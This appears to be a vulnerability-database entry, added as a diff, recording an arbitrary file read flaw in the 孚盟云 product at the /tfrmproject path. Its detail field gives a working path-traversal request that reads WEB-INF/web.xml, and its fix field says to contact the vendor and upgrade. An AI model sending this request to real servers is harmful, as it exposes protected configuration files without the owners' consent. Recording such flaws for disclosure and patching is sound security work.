@@ -1,0 +1,11 @@
+vendor = "孚盟云"
+name = "孚盟云 tfrmproject 任意文件读取漏洞"
+type = "任意文件读取"
+path = "/tfrmproject"
+version = ""
+detail = "GET /tfrmproject/../../WEB-INF/web.xml HTTP/1.1 Host: target"
+fix = "联系厂商升级"
+date = 20260415
+label = "nday"
+cve = "TVD-2026-08938"
+verifier = "AdySec"
